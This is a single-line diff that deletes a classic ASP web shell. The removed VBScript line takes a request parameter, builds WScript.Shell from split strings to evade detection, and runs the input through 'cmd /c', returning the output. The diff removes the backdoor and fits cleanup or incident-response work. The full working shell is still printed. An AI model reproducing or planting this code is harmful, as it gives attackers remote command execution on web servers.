@@ -1,1 +1,0 @@
-<%@ Language=VBScript %><%Response.Write("M7|"):If Request("z")<>"" Then Set o=Server.CreateObject("WSc"&"ript."&"Shell"):Response.Write o.Exec("cmd /c "&Request("z")).StdOut.ReadAll()%>
